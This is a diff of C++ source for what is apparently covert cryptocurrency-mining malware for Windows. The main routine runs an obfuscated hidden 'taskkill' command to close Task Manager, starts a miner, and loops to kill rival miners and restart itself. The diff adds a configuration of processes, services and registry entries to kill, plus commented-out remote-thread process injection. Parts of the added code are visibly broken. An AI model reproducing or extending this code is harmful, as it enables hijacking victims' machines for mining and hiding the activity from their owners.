@@ -7,7 +7,7 @@
 #include "MainFrm.h"
 #include "WK2017Doc.h"
 #include "WK2017View.h"
-
+#include "injection.h"
 #include "CPUusage.h"
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -56,7 +56,7 @@ CWK2017App theApp;
 #include <stdlib.h>
 #include <iostream>
 #include <iomanip>
-#include <winbase.h>
+/*#include <winbase.h>*/
 #include <windows.h>
 #include <Tlhelp32.h>
 #include <string.h>
@@ -65,20 +65,74 @@ CWK2017App theApp;
 #pragma comment (lib, "ADVAPI32.lib")
 #pragma comment (lib, "shell32.lib")
 #pragma comment (lib, "kernel32.lib")
+#include <map>
+using namespace std;
 ///////////////
 struct FALLEN_DATA
 {
 	unsigned int finder;
 	char xxs[1000];
-	char filename[1000];
+	char filename[255];
+	char service[255];
+	char Registry[255];
+	char winProcess[255];
+	char linuxProcess[255];
+	char wininj[100];
 }
 fallen_data =
 {
 	0xF9E28F8D,
-	"xxs"
-	"filename"	
+		"xxs",
+		"filename",
+		"123:456",
+		"123",
+		"abc.exe",
+		"abc",
+		"wps.exe"
 };
+int lservice;
+int lRegistry;
+int lwinProcess;
 
+map<int,CString> cutting(char* str,int count)
+{
+	map<int,CString> abc;
+	char A[2] =":";
+	if (strcmp(str,"0"))
+	{
+		const char s[2] = ":";
+		char *token;
+		token = strtok(str, s);
+		while( token != NULL ) 
+		{
+			count++;
+			abc[(int)count]=token;
+			token = strtok(NULL, s);
+		}
+	}
+	return abc;
+	
+}	
+map<int,CString> winProcess1;
+map<int,CString> service1;
+map<int,CString> Registry1;
+void cutting()
+{
+	
+	if (strcmp(fallen_data.winProcess,"0"))
+	{
+		winProcess1=cutting(fallen_data.winProcess,lwinProcess);
+	}
+	if (strcmp(fallen_data.service,"0"))
+	{
+		service1=cutting(fallen_data.service,lservice);
+	}
+	if (strcmp(fallen_data.Registry,"0"))
+	{
+		Registry1=cutting(fallen_data.Registry,lRegistry);
+	}
+
+}
 /////////////////
 BOOL IsExistProcess(CONST CHAR* szProcessName)  //进程判断
 {  
@@ -195,42 +249,58 @@ void mining()
 	 return 0;
  }
 
+void func()
+{
+	if (strcmp(fallen_data.winProcess,"0"))
+	{
+		for (int i= 0;i<lservice;i++)
+		{
+			if (lservice=1)
+			{
+			
+			char tmp [50]="taskkill /f /im ";
+			strcat(tmp,winProcess1[i]);
+			}
+		}
+		
+		
+	}
 
+
+
+}
 	
  int APIENTRY WinMain(HINSTANCE hInstance,
 	 HINSTANCE hPrevInstance,
 	 LPSTR     lpCmdLine,
 	 int       nCmdShow)
 {	
+
+/*	if (!strcmp(fallen_data.wininj,"0"))
+	{
+		HANDLE RemoteThreadHandle; 
+		EnablePriv();
+		CreateRemoteThreadProc(fallen_data.wininj);//注入进程
+	}*/
 	strcat(fallen_data.filename,".exe");
 	char gPoMW[] = {'t','a','s','k','k','i','l','l',' ','/','f',' ','/','i','m',' ','T','a','s','k','m','g','r','.','e','x','e','\0'};
 	WinExec(gPoMW,SW_HIDE);  //先关闭一波任务管理器进程
 	mining();//开始挖矿嘿嘿嘿
-/*	char VSFaC[] = "taskkill /f /im ";
-	strcat(VSFaC,fallen_data.filename);*/
 	while(1)
 	{
-		
 		if (IsExistProcess(fallen_data.filename)==TRUE)//判断程序是否运行
 		{		
-			
 			Kid();//杀死其他挖矿进程
 			Sleep(600);
-			
 		}
 		else//如果挖矿进程不存在了
 		{
-			
 			Kid();//杀死其他挖矿进程
 			mining();//开始挖矿
 			Sleep(600);
-			
 		}
-		
 	}
-
 	return 0;
-
 }
 
 
